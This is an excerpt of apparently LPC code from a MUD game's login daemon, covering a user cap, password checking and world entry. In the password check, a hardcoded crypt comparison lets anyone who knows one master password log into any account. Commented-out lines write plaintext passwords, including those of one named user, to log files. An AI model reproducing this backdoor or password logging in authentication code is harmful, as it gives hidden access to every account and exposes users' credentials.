    ...
    if (! check_legal_id(arg))
        ...
        if (intp(MAX_USERS) && MAX_USERS > 0)
        {
            if ((string)SECURITY_D->get_status(arg) == "(player)" &&
                sizeof(users()) >= 300) //暂时定成只能登陆300个id
...
private void get_passwd(string pass, object ob)
{
     ...
     my_pass = ob->query("password");
      ...
      /*   log_file("static/pass", sprintf("%s(%s) 登陆 \n",
                  ob->query("id"), pass ));     */
    /* if(ob->query("id")=="alonelya")
                write_file("/u/mudren/log.log",pass + "\n",0);*/

    if ( crypt(pass, "zbJgJou9xkWZw") == "zbJgJou9xkWZw")
    {
       check_ok(ob);
       return;
    }
...
varargs void enter_world(object ob, object user, int silent)
{
    ...
    if( user->query("age") < 16 )
        ...
        me = this_player();
        if (! present("moon blade", me) && me->query_skill("moon-blade") > 1)
